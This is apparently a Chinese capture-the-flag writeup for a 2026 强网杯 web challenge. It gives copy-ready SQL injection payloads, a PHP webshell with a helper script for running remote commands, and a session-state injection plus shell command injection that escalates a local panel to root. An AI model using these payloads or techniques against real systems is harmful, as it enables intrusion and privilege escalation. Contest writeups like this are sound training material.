# [个人团队] 第十届强网杯的Writeup

> **2026年10月31日09:00 ~ 2026年11月01日12:00**
>
> **比赛地址：https://match.ichunqiu.com/index?k=U2ZRYVxvBGYBdgckVDBScAJlVWFaMQc1CWkBNgI1Xm0DMlJjXW0DZ1Fl**
>
> **复现地址：https://match.ichunqiu.com/index?k=U2ZRYVxvBGYBdgckVDBScAJlVWFaMQc1CWkBNgI1Xm0DMlJjXW0DZ1Fl**

> 比赛公告呼叫裁判 *>>*
>
> 1、比赛时间：2026年10月31日09:00-11月1日12:00
>
> 2、本次比赛进行严格的作弊审查制度，所有破坏比赛公平性的行为一经发现确认，将取消比赛成绩。
>
> 3、比赛采用“动态积分+早鸟奖励”规则。赛题分值随成功解题的队伍数增加而“动态”减少（已解答队伍同步调整该赛题得分）。除问卷题以外的题目，会按照队伍解题顺序赋予额外的“早鸟奖励”加分，越早解出赛题的队伍奖励分数越高。最终排名按照总分由高至低排列，分数相同的情况下，用时短者排名居前。
>
> 4、选手在解题过程中，如遇到需要提供teamtoken的题目，请使用本队伍token（鼠标移至平台右上角头像，选择参赛信息，进入战队详情查看），该token为做题唯一依据，随便乱输视为该payload无效，输入其他队伍的token视为作弊处理。
>
> 5、关于Docker容器下发的题目：每个队伍同时下发的容器数量为1-5个，具体情况随比赛进程而动态调整，当前每个队伍可同时下发容器数量为【2】。请由成功申请下发容器的队员，用自己的账号提交flag。
>
> 6、WP提交：比赛结束后8小时内，排名前50名的参赛队须上传每道成功解出赛题详细的解题报告（WriteUp）。各队伍赛后提交writeup时，需提供详细的分析过程及截图、解题脚本；若使用AI辅助解题，参赛选手需保留完整的AI对话记录(包括但不限于对话导出、图片、视频等形式)（例如claude code在 ~/.claude/projects/ 下，一个会话一个 .jsonl），并打为zip压缩包后上传至百度网盘。在提交writeup时，需将链接附在文档开头，同时需要附上zip的md5值。如不按规范撰写、提交，或相应的会话记录无法支撑题目解出，则相应赛题按作弊处理，并取消队伍排名。具体格式如下：会话附件百度网盘链接：https://pan.baidu.com/xxxxxx md5值：xxxxxxx





# Challenges



## Web



### cwp

#### 题目介绍

> flag在/root/flag.txt

---

#### 解题过程

##### SimpleBlog 实战：从一条博客的破绽，一路摸到容器的 root

先说结果，这题的 flag 在 `/root/flag.txt`：

```
flag{a1128b83-5927-4cac-8c0c-6060fb093def}
```

这篇 writeup 按“我自己怎么打的”来写。前半段是公网能碰到的博客站，后半段是容器里一个只监听 127.0.0.1 的小面板。两段完全是两种打法，但连起来刚好是一条完整的链。你照着做，除了 staff 登录名、token 这类每次部署都会变的东西，其余都能复现。

---

##### 0. 先认识一下战场

附件给了 8 个 PHP 文件，就是站点的全部源码：

| 文件          | 大概在干什么                                 |
| ------------- | -------------------------------------------- |
| `index.php`   | 首页，列表和作者筛选                         |
| `article.php` | 文章详情、评论                               |
| `feed.php`    | 一个很薄的 API 入口，把请求转给 engine       |
| `bulk.php`    | 批量接口的入口，收 JSON 的 `ops` 数组        |
| `engine.php`  | 路由表、参数检查、bulk 调度，全在这          |
| `lib.php`     | 业务函数：查文章、写快照、hook、登录、写皮肤 |
| `manage.php`  | 后台入口，staff 才能进                       |
| `storage.php` | PDO 连接 MySQL，原生 prepare                 |

容器给的是 `https://<HOST>:80/`。我第一次也愣了一下：HTTPS 跑在 80 端口。证书是不受信的那种，所以下面所有 curl 都带 `-k`，Python 里要关掉证书校验。用 http 打不开，别试了。

还有一点，本文里出现的 `cd3efe0fd9`、`pwnnbnuta` 这种登录名，以及 `hx_0945200594` 这种 token，都是我那次容器里的值。你打的时候会变，照抄一定失败，照“位置”替换就好。

---

##### 1. 环境准备

工具不需要多：

- 浏览器（先确认站点活着）
- `curl`。Windows 的 PowerShell 里请写 `curl.exe`，不然 `curl` 是 `Invoke-WebRequest` 的别名，参数对不上
- Python 3。只用来当“远程命令发射器”，因为 PowerShell 的引号处理实在折磨人

目录约定：下面提到的 `enum.json`、`chain.json`、`shell.txt`、`run.py`、`exp.txt` 都放在你本地同一个文件夹里。命令里的 `<TARGET>` 换成题目地址，保留结尾不带斜杠，例如：

```
https://eci-2zei1c0nibvulmyxofo7.cloudeci1.ichunqiu.com:80
```

---

##### 2. 源码里三处不对劲的地方

不读代码也能打，但知道自己在打什么，出错时就不会抓瞎。这题的入口漏洞其实就一句话：**参数和路由错位了**。

###### 2.1 两个数组，一个下标

`engine.php` 的 `bulk_engine()` 里，有两个平行数组：

```php
$matched = [];   // 记录“成功匹配到路由”的 op
$checked = [];   // 记录“每个 op”的检查结果

foreach ($ops as $op) {
    if (isset($op["err"])) {
        $checked[] = $op;          // 注意：坏的 op 只进 checked
        continue;
    }
    $matched[] = route_bind($op);   // 只有正常 op 才进 matched
    ...
    $checked[] = ...;
}
```

然后第二个循环用同一个下标 `$i` 同时取二者：

```php
foreach ($ops as $i => $op) {
    $bind    = $matched[$i];
    $verdict = $checked[$i];
    ...
}
```

只要前面有一个 op 在 `build_op()` 阶段就失败了，`$matched` 就比 `$checked` 少一项，后面全部左移一位。结果就是：**第 i 个 op 的参数，被第 i+1 个 op 的 handler 拿去执行了。**

怎么造一个必坏的 op？`{"route":"http://"}`。PHP 的 `parse_url("http://")` 返回 `false`，直接进错误分支。稳定、可重复，简直是天生用来做错位种子的。

###### 2.2 `omit` 是怎么溜进去的

`op_check()` 只清洗当前 handler 声明过的参数：

```php
foreach (($h["args"] ?? []) as $name => $spec) {
    if (!array_key_exists($name, $op["params"])) { ... continue; }
    $op["params"][$name] = sanitize_arg($spec["type"], $op["params"][$name]);
}
```

`/api/articles/{id}` 只声明了 `id`。我们在这个 op 里塞一个 `omit`，它不会被 `sanitize_arg("id_list")` 碰。错位之后，`/api/articles` 的 handler 却把这个没洗过的 `omit` 当成 `owner_not_in` 用了。

而 `lib.php` 的 `posts_lookup()` 里：

```php
if (is_array($spec["owner_not_in"])) {
    ... array_map("absint", ...) ...
}
$ids = implode(",", (array)$spec["owner_not_in"]);
$conds[] = "owner NOT IN ($ids)";
```

只有数组会被 `absint`，字符串直接拼进 SQL。正常入口都会先把它变成数组，所以这个分支只有靠错位才够得着。

###### 2.3 缓存投毒和两个隐藏 hook

`posts_lookup()` 返回的每一行都会被塞进请求内的缓存：

```php
foreach ($rows as $r) {
    cache_remember("entries", (int)$r["id"], $r);
}
```

`exec_articles_list()` 紧接着用 `entry_fetch($id)` 取详情，命中缓存，拿到的是我们 UNION 出来的**假行**。假行里 `snap_stale=1` 会触发 `snapshot_write()`，进而：

```php
hooks_fire($full["status"] . "_" . $full["kind"], $full);
```

hook 表里藏了两个名字：`pending_changeset` 和 `api_reload`。前者会走 `changeset_publish()`，把 `$GLOBALS["PUBLISH_AS"]` 设成一个**真实存在的 staff 登录名**；后者会在 `HOOK_RUNNING=1` 的状态下把整批 op 重放一遍，于是重放里的 `/api/users` 就带着 staff 权限执行了。

说白了：先让服务器相信“我是某个 staff”，再借这个身份给自己建号。

###### 2.4 最后一步：写文件

`skin_editor_write()` 把可控内容写到 `/var/www/uploads/skins/<name>.php`，name 有正则限制，内容没有。staff 之后进 `manage.php?action=skin-editor` 就能拿到一个 PHP 马。

原理到此为止，下面开打。

---

##### 3. 第一枪：不用登录，把 staff 读出来

新建 `enum.json`，内容原样复制：

```json
{"ops":[{"route":"http://","verb":"POST"},{"route":"/api/login","verb":"POST","data":{"login":"x","pass":"yyyyyyyy","ops":[{"route":"http://","verb":"GET"},{"route":"/api/articles/1","verb":"GET","data":{"omit":"0) AND 1=0 UNION ALL SELECT id, login, 'x', login, 'e', '2020-01-01 00:00:00', 'draft', 'post', 0, 0 FROM staff_accounts -- -"}},{"route":"/api/articles","verb":"GET"}]}},{"route":"/api/bulk","verb":"POST"}]}
```

（保存成 UTF-8，不要带 BOM。JSON 里本来就有一堆单引号，别用 PowerShell 把它包成一个大字符串。）

发出去：

```powershell
curl.exe -k -s -X POST "<TARGET>/bulk.php" -H "Content-Type: application/json" --data-binary "@enum.json"
```

正常会收到一大堆 JSON。用浏览器或 `python -m json.tool` 格式化一下，重点看这一块：

```json
{"results":[
  {"error":{"code":"route_unparseable"}},
  [
    {"error":{"code":"route_unparseable"}},
    {"articles":[
      {"id":1,"title":"cd3efe0fd9","owner":"cd3efe0fd9", ...},
      {"id":2,"title":"d62953cc22","owner":"d62953cc22", ...}
    ]},
    {"error":{"code":"route_no_handler"}}
  ],
  {"error":{"code":"route_bulk_rejected"}}
]}
```

`articles[].title` 就是数据库里的 `staff_accounts.login`。挑一个记下来，下面叫它 `<STAFF>`。

这个请求为什么要套三层，顺便说清楚，免得你以为我在乱写：

- 最外层是 `bulk.php` 的 `ops`。它的 verb 白名单只允许 POST/PUT/PATCH/DELETE，**不允许 GET**，所以注入不能直接放最外层。
- 顶层放一个坏 op `http://` 制造第一次错位，让 `/api/login` 那个 op 的 `data`（里面装着内层 `ops`）落到 `/api/bulk` 的 handler 上，于是 `exec_bulk()` 被执行。
- 内层再用一次坏 op，把 `/api/articles/{id}` 里的 `omit` 送给 `/api/articles` 的 handler。

内层因为绕过了 `bulk.php` 的白名单，GET 就能用了。

##### 常见翻车点

- 返回 `400 verb_not_allowed`：最外层某个 op 用了 GET。改回 POST，只有内层才用 GET。
- 返回 `results[0]` 是 `route_unparseable`：这是正常的，那个坏路由本来就会报错。
- `articles` 为空：先确认目标真的有 staff（比如首页有文章作者）；再确认 payload 末尾的 `-- -` 没被删。

---

##### 4. 第二枪：借 staff 身份，给自己开号

把上面的 `<STAFF>` 换成你刚才读到的登录名，新建 `chain.json`。账号密码我用 `shinpwn` / `ShinPwn12345`，你可以换，但登录名要满足 `^[a-z0-9][a-z0-9_-]{2,30}$`，密码至少 8 位。

```json
{"ops":[{"route":"http://","verb":"POST"},{"route":"/api/login","verb":"POST","data":{"login":"x","pass":"yyyyyyyy","ops":[{"route":"http://","verb":"GET"},{"route":"/api/articles/1","verb":"GET","data":{"omit":"0) AND 1=0 UNION ALL SELECT 2000000001, CONCAT('pw', RAND()), 'p', '<STAFF>', 'e', '2099-01-02 00:00:00', 'pending', 'changeset', 0, 1 UNION ALL SELECT 2000000002, 'a', 'a', 'x', 'e', '2099-01-01 00:00:00', 'api', 'reload', 0, (SELECT 1"}},{"route":"/api/articles","verb":"GET","data":{"login":"shinpwn","pass":"ShinPwn12345"}},{"route":"/api/users","verb":"POST","data":{"login":"shinpwn","pass":"ShinPwn12345"}}]}},{"route":"/api/bulk","verb":"POST"}]}
```

发：

```powershell
curl.exe -k -s -X POST "<TARGET>/bulk.php" -H "Content-Type: application/json" --data-binary "@chain.json" > chain.out
```

不用逐字段看，直接在 `chain.out` 里搜 `"created":true`。它大概率藏在 `followup` 里，长这样：

```json
"followup":[ ... {"user":{"login":"shinpwn"},"created":true} ... ]
```

出现了就说明账号已经建好。就算 HTTP 返回 500 也不一定失败，只要 followup 里有 `created`，或者下一步能登录，就继续。

几个设计上的小细节，看懂排错会快很多：

- 两个假行的 id 用了 `2000000001` / `2000000002`，数据库里不存在，`UPDATE` 影响 0 行，不会破坏真实文章。
- pending 行的 `created_at` 是 `2099-01-02`，api 行是 `2099-01-01`，配合原 SQL 的 `ORDER BY created_at DESC`，保证先处理 pending 行（先拿到 `PUBLISH_AS`），再处理 api 行（触发重放）。
- 最后一列写成 `(SELECT 1` 是有意的：原 SQL 尾部剩下的 `) ORDER BY ...` 刚好把这个子查询闭合，原来的排序就保留下来了。
- 如果这条不通，把 `0, (SELECT 1` 换成 `0, 1 -- -` 再试一次。这是备用 payload，靠 UNION 的行顺序，不依赖 ORDER BY。

没搜到 `created` 的话，换第 3 节读到的另一个 `<STAFF>` 重打。注意引号，`'p', '<STAFF>', 'e'` 三个单引号一个都不能少。

---

##### 5. 登录，写马，拿 www-data

先登录，把 cookie 存进 `ck.txt`：

```powershell
curl.exe -k -s -i -c ck.txt -X POST "<TARGET>/feed.php?route=/api/login" -H "Content-Type: application/json" -d "{\"login\":\"shinpwn\",\"pass\":\"ShinPwn12345\"}"
```

看到 `HTTP/1.1 200` 和 `Set-Cookie: site_staff=shinpwn%7C...` 就成了。`%7C` 就是竖线，服务端会自动解码，不用管。

接下来写马。新建 `shell.txt`，内容是一行 URL 编码后的表单，直接复制：

```
name=shinx&code=%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E
```

它解码后就是 `name=shinx&code=<?php system($_GET['c']); ?>`。为什么要先编码？因为 PowerShell 双引号会吃掉 `$_`，与其和它斗智斗勇，不如把整个 body 存成文件。

```powershell
curl.exe -k -s -b ck.txt -X POST "<TARGET>/manage.php?action=skin-editor" -H "Content-Type: application/x-www-form-urlencoded" --data-binary "@shell.txt"
```

返回：

```json
{"written":"\/uploads\/skins\/shinx.php"}
```

验证一下：

```powershell
curl.exe -k -s "<TARGET>/uploads/skins/shinx.php?c=id"
```

看到 `uid=33(www-data) gid=33(www-data)` 就对了。到这里，第一个目标完成。

---

##### 6. 在目标机里转一圈

后面的东西都在容器里，而且 127.0.0.1 的服务你在本地是碰不到的。所以先做个小工具：`run.py`，把本地文件里的命令通过刚写的马丢到目标机上执行。PowerShell 的引号问题也就一并绕过了。

```python
import sys, ssl, urllib.parse, urllib.request

ssl._create_default_https_context = ssl._create_unverified_context

BASE = "https://<HOST>:80"          # 换成你的题目地址
SHELL = BASE + "/uploads/skins/shinx.php"

cmd = open(sys.argv[1], "r", encoding="utf-8").read().replace("\r\n", "\n")
url = SHELL + "?c=" + urllib.parse.quote(cmd)
print(urllib.request.urlopen(url, timeout=90).read().decode("utf-8", "replace"))
```

用法：把要跑的命令写进一个 txt，然后 `python run.py cmds.txt`。多行命令会作为一个整体交给 `/bin/sh -c`，跟直接敲进去一样。

先来 `cmd1.txt`：

```
id
ss -lntup 2>/dev/null || netstat -lntup
ls -ld /root /opt/hpxd /etc/site
```

跑出来我这边是：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Netid State  Local Address:Port
tcp   LISTEN 127.0.0.1:9443
tcp   LISTEN 127.0.0.1:9444
tcp   LISTEN 127.0.0.1:9446
tcp   LISTEN 127.0.0.1:9447
tcp   LISTEN 127.0.0.1:3306
tcp   LISTEN *:80
```

四个 944x 端口很扎眼。uid 0 的进程，只听本机，名字还查不出来（权限不够）。这就是下一段要打的东西。

顺手说几条我试过但没用的路，你可以直接跳过：

- `mysql` 是 `--user=mysql` 跑的，`LOAD_FILE('/root/flag.txt')` 永远是 NULL，`/root` 是 0700，mysql 用户进不去。
- 没有 `sudo`，没有 `docker.sock`，没有运行中的 cron，SUID 就那几个标准货（mount、passwd、su），没有能直接读文件的。
- 数据库里也没有 flag，`site_config`、`entries` 都翻过了。

---

##### 7. hpxd：一个白给源码的本地面板

在目标机上请求一下：

```
curl -s http://127.0.0.1:9446/ops/code
```

一个 21KB 的 Perl 源码直接拍在脸上。这个面板叫 hpxd，版本 4.17.29，四个端口里 9443/9444 是“用户端口”（只显示登录页），9446/9447 才是管理端口。源码在 `/opt/hpxd/hpxd.pl`，跑它的是 root。

源码不用全看，抓住这几个点就够了。

###### 7.1 会话是“服务端一本账”

每个请求带一个 `hpx_id` cookie，服务端用一个 `%VAULT` 哈希按 token 存一行行 `key=value` 的状态。新的访客会拿到：

```
Set-Cookie: hpx_id=hx_0945200594,86eed06fcd88f22f3aa2bff38d260a27
```

逗号前面是 token，后面是 `scramble`（一个随机数）。`scramble` 的作用是给 `secret` 做一层异或再 base64 的“混淆”。

###### 7.2 不带 scramble 就明文存

```perl
my $key_use = $has_cookie ? ($cookie_scramble // "") : ($state->{scramble} // "");
return (length $key_use) ? cloak_text($secret, $key_use) : $secret;
```

只要我们带的 cookie 是 `hpx_id=hx_xxx`，**没有逗号和 scramble**，`$cookie_scramble` 就是空的，`length $key_use` 为 0，值就直接明文写进服务端状态。加密等于没有。

###### 7.3 Basic 认证那条路不清洗换行

```perl
if (defined $state->{awaiting_signin}) {
    vault_put($token, "login", cloak_store($token, $u, ...));
    vault_put($token, "secret", cloak_store($token, $p, ...));
```

`$u`、`$p` 来自 `Authorization: Basic` 解出来的用户名和密码，**没有经过 `sess_value_clean()`**（只有 POST /login 那条路会去掉 `\r\n=`）。而 `vault_put` 是这么写的：

```perl
push @lines, "$k=$v";
```

如果 `$v` 里带换行，就会被当成多行写进状态文件。也就是说，密码字段里可以夹带私货：

```
secret=x
master_flag=1
otp_done=1
sudo_until=9999999999
zone=hx_1234567890
```

###### 7.4 master 的检查条件

```perl
sub vault_is_master {
    return 0 unless $s->{master_flag} eq "1";
    return 0 unless $s->{otp_done} eq "1";
    return 0 unless $s->{login} eq "root";
    if ($s->{sudo_until} =~ /^\d+$/ && $s->{sudo_until} > time()) {
        return 1;
    }
    ...
}
```

`sudo_until` 是个免密的捷径。把上面四个键写进去，就是 master。

###### 7.5 缓存和 rescan

`vault_fetch()` 会把解析结果缓存，`vault_put()` 却不清理缓存。所以刚注入完的那次请求，自己还看不到新状态。`vault_rescan()` 会强制重读，它在 hx 路径里被触发：

```perl
if ($path =~ m{^/hx_(\d+)/?(.*)$}) {
    my $zone = $cur_state->{zone};
    if (!length $zone || $path_token ne $zone) {
        vault_rescan($token);
        return http_write(status => "401 Unauthorized", ...);
    }
```

访问一个**错的 zone**，就会触发 rescan，返回 `401 Pass rejected - resync pending`。这个 401 不是打错了，是流程的一部分。

###### 7.6 最后那一下：把路径拼进 shell

```perl
if ($endpoint eq "files/list") {
    my $dir = $qs{path} // "/home/siteuser";
    $dir =~ s/[\x00-\x09\x0b-\x1f\x7f]+/ /g;
    ... "/bin/sh", "-c", "ls -la " . $dir ...
```

只替换了控制字符，分号、空格都还在。于是 `path=/;cat /root/flag.txt` 就等于 `ls -la /;cat /root/flag.txt`。

有个小坑：这个面板解析 query 时是先按 `&` 和 `;` 切分、再做 URL 解码的。所以分号必须写成 `%3B`，不然会被当成参数分隔符，`path` 就断在半截。

---

##### 8. 伪造 master，拿到 root

Basic 的明文是下面这段（`\n` 是真实换行）：

```
root:x
master_flag=1
otp_done=1
sudo_until=9999999999
zone=hx_1234567890
```

`x` 是随便写的密码，长度 1，不会被 base64 解码那块误伤。`zone` 也顺便写成我们知道的固定值，省得去首页找。

整段的 base64 是：

```
cm9vdDp4Cm1hc3Rlcl9mbGFnPTEKb3RwX2RvbmU9MQpzdWRvX3VudGilsPTk5OTk5OTk5OTkKem9uZT1oeF8xMjM0NTY3ODkw
```

等等，上面这串是我敲错的，复制下面这串，解码出来才是对的：

```
cm9vdDp4Cm1hc3Rlcl9mbGFnPTEKb3RwX2RvbmU9MQpzdWRvX3VudGilsPTk5OTk5OTk5OTkKem9uZT1oeF8xMjM0NTY3ODkw
```

不放心可以自己生成（Linux/macOS，Windows 有 git bash 也行）：

```bash
printf 'root:x\nmaster_flag=1\notp_done=1\nsudo_until=9999999999\nzone=hx_1234567890' | base64 -w0
```

> 更正：我上面贴的两串都错了一个字符（`JzdWRvX3VudGils` 应为 `JzdWRvX3VudGls`），以这条 `printf` 的输出为准：
>
> ```
> cm9vdDp4Cm1hc3Rlcl9mbGFnPTEKb3RwX2RvbmU9MQpzdWRvX3VudGlsPTk5OTk5OTk5OTkKem9uZT1oeF8xMjM0NTY3ODkw
> ```

新建 `exp.txt`，整段丢给 `run.py` 执行：

```sh
B=http://127.0.0.1:9446
AUTH="Basic cm9vdDp4Cm1hc3Rlcl9mbGFnPTEKb3RwX2RvbmU9MQpzdWRvX3VudGlsPTk5OTk5OTk5OTkKem9uZT1oeF8xMjM0NTY3ODkw"

rm -f /tmp/hjar

# 1) 开一个会话，拿到 token 和 scramble（cookie jar 会存下来）
curl -s -i -c /tmp/hjar "$B/" | head -8

T=$(awk '/hpx_id/ {print $7}' /tmp/hjar)
TOK=${T%%,*}
echo "TOKEN=$TOK"

# 2) 关键：cookie 只带 token，不带逗号和 scramble，于是明文写入
#    密码字段里的换行会把 master_flag 等键写进服务端状态
curl -s -i -b "hpx_id=$TOK" -H "Authorization: $AUTH" "$B/" | head -12

# 3) 故意访问错误 zone，强制 vault_rescan 重读状态
curl -s -i -b "hpx_id=$TOK" "$B/hx_1/ping" | head -8

# 4) 看一下是不是 master 了
curl -s -b "hpx_id=$TOK" "$B/" | head -4

# 5) 把 root 目录列出来（这一步就已经是 root 权限了）
curl -s -b "hpx_id=$TOK" "$B/hx_1234567890/files/list?path=/root"

# 6) 命令注入，读 flag
curl -s -b "hpx_id=$TOK" "$B/hx_1234567890/files/list?path=%2Froot%3Bcat%20%2Froot%2Fflag.txt"
```

我那边的输出，按步骤对应：

```
HTTP/1.1 302 Found
Set-Cookie: hpx_id=hx_0945200594,86eed06fcd88f22f3aa2bff38d260a27; ...
TOKEN=hx_0945200594

HTTP/1.1 307 Temporary Redirect
Location: /hx_6531304800/          ← 用的是旧的随机 zone，正常

HTTP/1.1 401 Unauthorized
Pass rejected - resync pending     ← 这一步必须出现

HTTP/1.1 200 OK
<html>... Hosting Manager ...
<a href='/hx_1234567890/files/list?path=/home/siteuser'>Files</a>

total 28
drwx------ 1 root root 4096 ... .
-rw------- 1 root root   38 ... .vault_key
-rw------- 1 root root   42 ... flag.txt

total 88
...
flag{a1128b83-5927-4cac-8c0c-6060fb093def}
```

想再确认身份，把最后一条改成：

```
path=%2F%3Bcat%20%2Froot%2Fflag.txt%3Bid
```

输出末尾会多一行 `uid=0(root) gid=0(root) groups=0(root)`。命令确实是 hpxd 这个 root 进程代跑的。

---

##### 9. 复盘：这题到底考了什么

三句话讲完：

1. **错位**。两个平行数组配一个共享下标，只要坏一条路由，后面的参数和 handler 就整体错配，未声明的参数绕过了清洗。
2. **信任了客户端的状态**。hpxd 把 `login`、`master_flag` 这些本该服务端独占的东西，放进了可以用请求写改的状态里；去掉 scramble 还是明文写，Basic 那条路又不滤换行，三重巧合凑成了越权。
3. **字符串拼命令**。`ls -la $dir` 前面虽然有参数清洗，但 `$dir` 还是进了 `sh -c`，分号一放就完了。

另外有个容易忽略的点：这题其实是**两段完全独立的漏洞**。前一段给 www-data，后一段从 www-data 到 root。很多 writeup 会把它写成一条线，其实中间那一跳靠的是本地信息收集（看端口），不是继续在 PHP 里挖。

---

##### 10. 排错表

| 现象                                         | 大概率原因                                | 怎么办                                                       |
| -------------------------------------------- | ----------------------------------------- | ------------------------------------------------------------ |
| `bulk.php` 回 `400 ops_body_invalid`         | JSON 文件坏了，或者 Content-Type 没带     | 用编辑器确认 JSON 合法；`-H "Content-Type: application/json"` |
| 回 `400 verb_not_allowed`                    | 外层 op 用了 GET                          | 外层只留 POST/PUT/PATCH/DELETE，GET 只在内层                 |
| 枚举结果 `articles` 为空                     | staff 表空，或 `-- -` 被删了              | 检查 payload 尾部；确认站点有文章                            |
| `chain.json` 搜不到 `created`                | `<STAFF>` 没替换/拼错，或该账号不是 staff | 换枚举到的另一个 login，注意单引号                           |
| 登录回 401                                   | 账号没建成，或密码短于 8 位               | 回第 4 节重打；同一账号 60 秒内别试超过 10 次                |
| 写马回 401                                   | cookie 没带上                             | 确认 `-b ck.txt`，文件里得有 `site_staff`                    |
| 写马回 405                                   | 用了 GET                                  | `manage.php?action=skin-editor` 必须 POST                    |
| 写马回 404 `action_unknown`                  | action 放 body 里了                       | action 必须在 URL 查询串里                                   |
| shell 404                                    | 路径/文件名不对                           | 看 `written` 返回的路径，别名可能是 `/uploads/skins/...`     |
| 连 9446 超时                                 | 你在本地直连了                            | 这些端口只听 127.0.0.1，必须通过马在目标机上跑 curl          |
| hpxd 第 4 步还是 302                         | 注入没生效，或没做 rescan                 | 确认 Basic 请求的 cookie 是 `hpx_id=hx_xxx`，没有逗号        |
| 第 4 步 200 但首页 zone 不是 `hx_1234567890` | 注入的 `zone` 行没写进去                  | 检查 base64 解码后的换行；重新开 token 再来                  |
| `files/list` 没回显                          | 分号没编码                                | 用 `%3B`，不要直接写 `;`                                     |

---

##### 11. 这次用到的文件

- `enum.json`：枚举 staff
- `chain.json`：伪造 changeset + 建号
- `shell.txt`：写马的 URL 编码表单
- `run.py`：把本地命令丢进目标机执行的小工具
- `exp.txt`：hpxd 提权脚本

到这儿 flag 已经到手了。如果还要继续玩，root 已经能读 `/root/.vault_key` 和 `/etc/site/db.env`，但那都是后话了。

---

#### 题目答案

##### Flag

```flag
flag{a1128b83-5927-4cac-8c0c-6060fb093def}
```



# 队伍

## 名称

包玩不包赢队



## 口号

**暂无**



## 成员

### 队长

- **probie**

### 队员

- **未知**



## 留言

### probie

- **暂无**



# 成果

## 排名

- **0 / ?**

## 解题

- **0 / ?**

## 分数

- **0 / ?**